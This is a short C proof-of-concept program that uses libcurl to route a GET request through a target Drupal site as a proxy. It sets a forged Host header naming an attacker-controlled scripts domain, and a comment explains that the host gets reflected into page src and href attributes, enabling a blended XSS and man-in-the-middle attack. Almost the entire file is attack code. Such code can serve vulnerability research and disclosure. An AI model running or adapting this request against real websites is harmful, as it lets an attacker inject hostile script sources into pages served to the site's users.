/************************************************************************
 * Proof of concept for making a proxy GET request to a target drupal
 * website using libcurl
 ************************************************************************/
#include <curl/curl.h>

int main(int argc, char *argv[])
{
  CURLcode ret;
  CURL *hnd = curl_easy_init();
  curl_easy_setopt(hnd, CURLOPT_URL, "http://attackersite.example.com:80/"); /* HTTP port optional */
  curl_easy_setopt(hnd, CURLOPT_PROXY, "http://target.example.com:80"); /* HTTP Port should be specified here */
  curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
  curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/7.21.6 (x86_64-pc-linux-gnu) libcurl/7.21.6 OpenSSL/1.0.0e zlib/1.2.3.4 libidn/1.22 librtmp/2.3");
  curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
  curl_easy_setopt(hnd, CURLOPT_VERBOSE, 1L);

  /* Set custom Host header */
  struct curl_slist *headers=NULL; /* init to NULL is important */
  /* The host is inserted into the page in the src or href attribute for many tags on the returned page (Potential blended XSS-MITM attack) */
  headers = curl_slist_append(headers, "Host: attackersite.scripts.example.com");
  /* headers = curl_slist_append(headers, "X-more-headers-here: text"); */
  curl_easy_setopt(hnd, CURLOPT_HTTPHEADER, headers);/* pass our list of custom made headers */  
  
  ret = curl_easy_perform(hnd);
  curl_easy_cleanup(hnd);

  curl_slist_free_all(headers); /* free the header list */

  return (int)ret;
}

